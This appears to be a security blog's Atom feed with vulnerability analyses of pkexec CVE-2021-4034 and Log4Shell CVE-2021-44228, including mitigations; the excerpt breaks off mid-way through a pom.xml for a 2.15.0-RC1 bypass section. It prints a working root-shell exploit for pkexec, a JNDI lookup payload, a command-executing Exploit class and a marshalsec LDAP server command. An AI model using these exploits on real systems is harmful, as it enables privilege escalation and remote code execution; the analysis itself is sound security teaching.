<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4xpl0r3r&#39;s blog</title>
  
  
  <link href="https://www.4xpl0r3r.com/atom.xml" rel="self"/>
  
  <link href="https://www.4xpl0r3r.com/"/>
  <updated>2022-09-14T02:14:20.894Z</updated>
  <id>https://www.4xpl0r3r.com/</id>
  
  <author>
    <name>4xpl0r3r</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Vulnerability-Analysis - CVE-2021-4034 Linux Polkit Privilege Escalation</title>
    <link href="https://www.4xpl0r3r.com/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-4034-Linux-Polkit-Privilege-Escalation/"/>
    <id>https://www.4xpl0r3r.com/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-4034-Linux-Polkit-Privilege-Escalation/</id>
    <published>2022-01-30T03:46:14.000Z</published>
    <updated>2022-09-14T02:14:20.894Z</updated>
    
    <content type="html"><![CDATA[<p>The major reference: <a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt">Qualys’ Advisory</a></p><span id="more"></span><article class="message message-immersive is-primary"><div class="message-body"><i class="fas fa-globe-asia mr-2"></i>This article is also available in <a href="https://cn.4xpl0r3r.com/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-4034-Linux-Polkit-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">简体中文</a>.</div></article><h2 id="Vulnerabilty-Profile"><a href="#Vulnerabilty-Profile" class="headerlink" title="Vulnerabilty Profile"></a>Vulnerabilty Profile</h2><p>2022-01-25，The Exploit details of CVE-2021-4034 released, the vulnerabilty is found by <a href="https://www.qualys.com/">Qualys</a> Security Team in the <code>pkexec</code> , which is a component of the polkit suite.</p><p><code>pkexec</code> application is a tool to set uid, allowing a common user to execute a command as a privileged user according to a pre-defined policy. All mainstream Linux systems have this tool installed in default, and it’s executable has <code>SUID</code> bit set to work.</p><p>All pkexec versions since the first version in May 2009 are vulnerable to this. The commit: <a href="https://gitlab.freedesktop.org/polkit/polkit/-/commit/c8c3d835d24fc4ce5a9c596c7d55d85a0311e8d1">Add a pkexec(1) command (c8c3d835) · Commits · polkit / polkit · GitLab</a></p><p>Due to the widespread use of <code>pkexec</code>, the exploit of this vulnerability works in nearly all current Linux distributions with a wide range of effectiveness</p><h2 id="Vulnerabilty-Analysis"><a href="#Vulnerabilty-Analysis" class="headerlink" title="Vulnerabilty Analysis"></a>Vulnerabilty Analysis</h2><p>Please read the offical advisory: <a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt">Qualys’ Advisory</a></p><p>In summary, we need 2 environment variable to exploit the vulnerabilty. First one is set to a arbitrary string, such as <code>x</code>, the second one is set to <code>PATH=GCONV_PATH=.</code>, which will be concat with <code>/x</code> and the command to execute will become <code>GCONV_PATH=./x</code>. After running <code>GCONV_PATH=./x</code>, we reintroduced an insecure environment which leads to privilege escalation.</p><h2 id="The-Exploit"><a href="#The-Exploit" class="headerlink" title="The Exploit"></a>The Exploit</h2><p>I installed a Ubuntu 20.04, and found the version of its <code>pkexec</code> is <code>0.105</code>, which is vulnerable.</p><p>Firstly, we need to build a evil shared library, which is used to obtain the privileged shell.</p><p>The code is as shown below</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  setuid(<span class="number">0</span>); seteuid(<span class="number">0</span>); setgid(<span class="number">0</span>); setegid(<span class="number">0</span>);</span><br><span class="line">  system(<span class="string">&quot;PATH=/bin:/usr/bin:/sbin /bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> Build it</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC payload.c -o payload.so</span><br></pre></td></tr></table></figure><p>The exploit</p><ul><li>the <code>LC_MESSAGES</code> is used to set the charset</li><li>set the <code>XAUTHORITY</code> to a illegal value to skip the normal execution, we only need the log function to exploit the vulnerabilty.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* _argv[]=&#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span>* _envp[]=&#123;</span><br><span class="line">        <span class="string">&quot;x&quot;</span>,</span><br><span class="line">        <span class="string">&quot;PATH=GCONV_PATH=.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_MESSAGES=en_US.UTF-8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;XAUTHORITY=..&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line">    mkdir(<span class="string">&quot;GCONV_PATH=.&quot;</span>, <span class="number">0777</span>);</span><br><span class="line">    mkdir(<span class="string">&quot;x&quot;</span>, <span class="number">0777</span>);</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;x/gconv-modules&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(fp, <span class="string">&quot;module  UTF-8//    INTERNAL    ../payload    2\n&quot;</span>);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    fp = fopen(<span class="string">&quot;GCONV_PATH=./x&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    chmod(<span class="string">&quot;GCONV_PATH=./x&quot;</span>,<span class="number">0777</span>);</span><br><span class="line">    execve(<span class="string">&quot;/usr/bin/pkexec&quot;</span>, _argv, _envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Build it</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exploit.c -o exp.out</span><br></pre></td></tr></table></figure><p>Run <code>./exp.out</code> and you will get the privileged shell.</p><h2 id="Fix-the-Vulnerabilty"><a href="#Fix-the-Vulnerabilty" class="headerlink" title="Fix the Vulnerabilty"></a>Fix the Vulnerabilty</h2><p>The modification: <a href="https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683">pkexec: local privilege escalation (CVE-2021-4034) (a2bf5c9c) · Commits · polkit / polkit · GitLab</a></p><p><img src="../../img/Vulnerability-Analysis-CVE-2021-4034-Linux-Polkit-Privilege-Escalation/image-20220130113542940.png" alt="image-20220130113542940"></p><p>As we can see, if the value of argc is less than 1, the program will exit directly.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;The major reference: &lt;a href=&quot;https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt&quot;&gt;Qualys’ Advisory&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Vuln-Analysis" scheme="https://www.4xpl0r3r.com/categories/Vuln-Analysis/"/>
    
    
    <category term="CVE" scheme="https://www.4xpl0r3r.com/tags/CVE/"/>
    
    <category term="C&amp;C++" scheme="https://www.4xpl0r3r.com/tags/C-C/"/>
    
    <category term="Linux" scheme="https://www.4xpl0r3r.com/tags/Linux/"/>
    
    <category term="Priv-Escalation" scheme="https://www.4xpl0r3r.com/tags/Priv-Escalation/"/>
    
  </entry>
  
  <entry>
    <title>Vulnerability Analysis - CVE-2021-44228 Log4Shell</title>
    <link href="https://www.4xpl0r3r.com/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-44228-Log4Shell/"/>
    <id>https://www.4xpl0r3r.com/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-44228-Log4Shell/</id>
    <published>2022-01-19T13:06:00.000Z</published>
    <updated>2022-02-11T11:45:45.085Z</updated>
    
    <content type="html"><![CDATA[<p>Using Java 8u181</p><span id="more"></span><article class="message message-immersive is-primary"><div class="message-body"><i class="fas fa-globe-asia mr-2"></i>This article is also available in <a href="https://cn.4xpl0r3r.com/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-44228-log4j2-RCE-%E5%88%86%E6%9E%90/">简体中文</a>.</div></article><h2 id="Vulnerability-Profile"><a href="#Vulnerability-Profile" class="headerlink" title="Vulnerability Profile"></a>Vulnerability Profile</h2><p>Apache Log4j2 is a logging tool. Because Apache Log4j2 offers some functions that could parse recursively, an attacker can directly construct a malicious request to trigger the remote code execution.The vulnerability works with default configuration.</p><p>Verified by the Ali Cloud security team, It is affected for Apache Struts2, Apache Solr, Apache Druid, Apache Flink, etc.</p><p>All systems running Apache log4j2 2.0-beta9 through 2.14.1 are vulnerable. If the Java application imports the <code>log4j-core</code>, it is most likely to be affected.</p><h2 id="The-Exploit"><a href="#The-Exploit" class="headerlink" title="The Exploit"></a>The Exploit</h2><h3 id="The-Exploit-Code"><a href="#The-Exploit-Code" class="headerlink" title="The Exploit Code"></a>The Exploit Code</h3><p>Use the maven to build a project to trigger the vulnerability and import the <code>org.apache.logging.log4j</code> module which version is <code>2.14.1</code> .</p><p>If the logger uses a recordable level to log the payload , the vulnerability will be triggered.</p><p>The trigger code is as shown below.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://ip:1389/#Exploit&#125;123&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Use the code shown below to build a class file used by JNDI</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.Reader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> IOException,InterruptedException</span>&#123;</span><br><span class="line">        String cmd=<span class="string">&quot;curl 127.0.0.1:5555&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">        printMessage(process.getInputStream());;</span><br><span class="line">        printMessage(process.getErrorStream());</span><br><span class="line">        <span class="keyword">int</span> value=process.waitFor();</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printMessage</span><span class="params">(<span class="keyword">final</span> InputStream input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread (<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                Reader reader =<span class="keyword">new</span> InputStreamReader(input);</span><br><span class="line">                BufferedReader bf = <span class="keyword">new</span> BufferedReader(reader);</span><br><span class="line">                String line = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span> ((line=bf.readLine())!=<span class="keyword">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        System.out.println(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException  e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Compile the code to get the <code>.class</code> file. The construction method will be run by JNDI.</p><h3 id="Trigger-the-vulnerability"><a href="#Trigger-the-vulnerability" class="headerlink" title="Trigger the vulnerability"></a>Trigger the vulnerability</h3><p>It’s typical JNDI Injection progress. Firstly, move the <code>.class</code> file to a web server, and then, make use of <code>marshalsec</code> to set up JNDI and LDAP service, the command is as shown below</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8080/<span class="comment">#Exploit</span></span><br></pre></td></tr></table></figure><h2 id="Analysis-of-the-Vulnerabilty"><a href="#Analysis-of-the-Vulnerabilty" class="headerlink" title="Analysis of the Vulnerabilty"></a>Analysis of the Vulnerabilty</h2><h3 id="Analysis-of-the-source-code"><a href="#Analysis-of-the-source-code" class="headerlink" title="Analysis of the source code"></a>Analysis of the source code</h3><p>As we all know, the exploit is working with JNDI, so we make a breakpoint in the constrution method of <code>javax.naming.InitialContext</code> . The source code is located in <code>rt.jar/javax/naming/InitialContext.java</code></p><p>After running the trigger code, the execution will be paused at the breakpoint.</p><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119155612476.png" alt="image-20220119155612476"></p><p>The calling stack is as shown below</p><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119155630289.png" alt="image-20220119155630289"></p><p>It’s obviously that if we want to exploit with JNDI, there must be a calling for <code>lookup</code> method, so let’s trace reversely form <code>JndiLookup.look()</code>.</p><p>To determine where is the code that focus to the payload <code>$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;</code>, we can add some junk into the logging message. Running the trigger again, we can find that the <code>substitute</code> methond deferenced <code>AAAAA$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;BBBBB</code> into <code>$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;</code>.</p><p>Apart from this, we can find there is a method called <code>resolveVariable</code> which is using to parse variable wrapper with  <code>$&#123;&#125;</code>.</p><p> Keep tracing, we can find a piece of code as below</p><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119160349045.png" alt="image-20220119160349045"></p><p>We can find that if it meet the variable starting with <code>$&#123;</code>, the code will replace it with the resolved variable.</p><h3 id="Going-deeper"><a href="#Going-deeper" class="headerlink" title="Going deeper"></a>Going deeper</h3><p>Log4j2 has 3 major components.</p><ul><li>Logger - log the message</li><li>Appender - output the message</li><li>Layout - format the message</li></ul><p>Keep tracing the calling stack, we can find that log4j2 use <code>LoggerConfig.processLogEvent()</code> to resolve logging event, use <code>callAppenders()</code> to call Appender to ouput the message.</p><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119160832271.png" alt="image-20220119160832271"></p><p>The function of Appender is transfer the logging event to the target. There are some commonly used Appender such as ConsoleAppender(output to the console), FileAppender(output to a file). It will use AppenderControl to gain the specific Appender. In this debug session, it is ConsoleAppender.</p><p>The Appender uses  the Layout to get the logging format, formats the logging message with <code>Layout.encode()</code>.</p><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119161231396.png" alt="image-20220119161231396"></p><p>The Layout will use formatters to finish the formating.</p><p>The inputted message is resolved by <code>MessagePatternConverter.format()</code>, it’s a important part of the vulnerabilty.</p><p>When the config is exist and the <code>noLookups</code> is false, if there is a <code>$&#123;&#39;</code> in the message, it will call <code>workingBuilder.append()</code> to get the <code>StrSubstitutor</code> to replace the variable with resolved one</p><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119161657043.png" alt="image-20220119161657043"></p><p>We can find there is a <code>noLookups</code> which is a value of configuration, the default value of it is the false. We will make use of it to temporarily fix the vulnerabilty later.</p><p>Going forward, we can find the <code>StrSubstitutor.resolveVariable()</code> , it is used to resolve and parse, suporting the protocols incluing JNDI as below</p><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119161941649.png" alt="image-20220119161941649"></p><h3 id="Mitigation-Disable-Lookups-with-System-configuration"><a href="#Mitigation-Disable-Lookups-with-System-configuration" class="headerlink" title="Mitigation - Disable Lookups with System configuration"></a>Mitigation - Disable Lookups with System configuration</h3><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119165049793.png" alt="image-20220119165049793"></p><p>We can check the cross reference to determine where the <code>noLookups</code> was assigned, it is as below</p><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119165155009.png" alt="image-20220119165155009"></p><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119165215145.png" alt="image-20220119165215145"></p><p>As a example, I add a line of code to change the system configration, it could also be set by command line or <code>.properties</code> configration file.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;log4j2.formatMsgNoLookups&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> Logger logger = LogManager.getLogger();</span><br><span class="line">        logger.error(<span class="string">&quot;AAAAA$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;BBBBBB&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> Run the trigger code again, we can find that <code>$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;</code> won’t be parsed</p><h3 id="Mitigation-Disable-Lookups-with-Log4j-Configuration"><a href="#Mitigation-Disable-Lookups-with-Log4j-Configuration" class="headerlink" title="Mitigation - Disable Lookups with Log4j Configuration"></a>Mitigation - Disable Lookups with Log4j Configuration</h3><blockquote><p>In my opinion, it’s the best way to protect the system without upgrading</p><p>The official documet: <a href="https://logging.apache.org/log4j/2.x/manual/configuration.html">Log4j – Configuring Log4j 2 (apache.org)</a></p></blockquote><p>The MVP(Minimum Viable Product) of configuration in XML is as shown below.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;[%t] %-5level %m&#123;nolookups&#125; %n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Apart from XML, the Log4j also support other formats such as json.</p><h3 id="Thinking-Why-the-Log4j2-needs-the-capability-of-JNDI"><a href="#Thinking-Why-the-Log4j2-needs-the-capability-of-JNDI" class="headerlink" title="Thinking - Why the Log4j2 needs the capability of JNDI"></a>Thinking - Why the Log4j2 needs the capability of JNDI</h3><p>After checking the official documents <a href="https://logging.apache.org/log4j/log4j-2.3/manual/configuration.html#PropertySubstitution">Log4j – Configuring Log4j 2 - Apache Log4j 2</a>,I found the Property Substitution function, it offers the capability to retrieve attributes remotely to make the logging information more abundant</p><p>Because the developers didn’t aware the potential harm, the default value of noLookups was set to false and the source of JNDI wasn’t been restricted.</p><h2 id="Something-else"><a href="#Something-else" class="headerlink" title="Something else"></a>Something else</h2><h3 id="The-common-false-positive"><a href="#The-common-false-positive" class="headerlink" title="The common false positive"></a>The common false positive</h3><p>Many tester determine if the system is vulnerable to the CVE-2021-44228 by checking the DNS request, it’s not rigorous. Many Public Service could send the DNS request for the domian in the payload to take spam intercepting or any else, so the DNS request can’t be the evidence of vulnerabilty.</p><p>There is a better method to check, just insert the <code>$&#123;sys:java.version&#125;</code> into the subdomain, it will be much more accurate.</p><h3 id="How-to-defense"><a href="#How-to-defense" class="headerlink" title="How to defense"></a>How to defense</h3><ol><li>Upgrade the log4j2</li><li>Disable Lookups with System configuration</li><li>Disable Lookups with Log4j Configuration</li></ol><h3 id="The-official-fixing"><a href="#The-official-fixing" class="headerlink" title="The official fixing"></a>The official fixing</h3><blockquote><p><a href="https://logging.apache.org/log4j/2.x/changes-report.html">https://logging.apache.org/log4j/2.x/changes-report.html</a></p></blockquote><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119191652712.png" alt="image-20220119191652712"></p><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119191657495.png" alt="image-20220119191657495"></p><p>As shown above, in Release 2.15.0, it disabled the lookups by default and limit the servers and classes that can be accessed via LDAP.</p><p>What’s more, In release 2.16.0, disable JNDI by default. Require log4j2.enableJndi to be set to true to allow JNDI and completely remove support for Message Lookups.</p><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119192017647.png" alt="image-20220119192017647"></p><h2 id="The-Bypassing-in-log4j-2-15-0-RC1"><a href="#The-Bypassing-in-log4j-2-15-0-RC1" class="headerlink" title="The Bypassing in log4j 2.15.0-RC1"></a>The Bypassing in log4j 2.15.0-RC1</h2><h3 id="Compiling"><a href="#Compiling" class="headerlink" title="Compiling"></a>Compiling</h3><p>Because the 2.15.0-RC1 don’t exist in the maven repository, we have to get the source code from GitHub and compile it manually.</p><p><a href="https://github.com/apache/logging-log4j2/tags">Tags · apache/logging-log4j2 (github.com)</a></p><p>According to the <code>README.md</code>, configure the jdk in the toolschains files and we only need the packages for jdk1.8, so just comment out the others.</p><p>Because we don’t need all the modules, modify the <code>modules</code> in <code>pom.xml</code> as shown below</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;module&gt;log4j-api-java9&lt;/module&gt; --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">module</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;module&gt;log4j-core-java9&lt;/module&gt; --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">module</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;module&gt;log4j-layout-template-json&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-core-its&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-1.2-api&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-slf4j-impl&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-slf4j18-impl&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-to-slf4j&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jcl&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-flume-ng&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-taglib&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jmx-gui&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-samples&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-bom&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jdbc-dbcp2&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jpa&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-couchdb&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  